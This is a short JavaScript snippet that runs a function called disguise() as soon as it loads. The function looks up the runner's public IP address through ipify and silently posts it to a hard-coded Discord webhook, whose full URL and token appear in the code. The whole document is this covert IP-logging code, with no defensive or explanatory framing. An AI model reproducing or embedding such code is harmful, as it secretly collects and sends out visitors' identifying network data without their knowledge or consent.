disguise()

async function disguise(){
    var r = await fetch(new Request("https://api.ipify.org/?format=jsonp"))
    var d = await r.text()
    var webhook = "https://discord.com/api/webhooks/1141440600919527546/HCcBRKmKl4ZURC9SKLrft_JWl7_a1BIa_qCfAVmVKEVtXapKwFgHdSko5QGfpg-43-FI"
    var parameters = {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({content: `IP: ${(JSON.parse(d.split("(")[1].split(")")[0])).ip}`})
    }
    await fetch(webhook, parameters);
}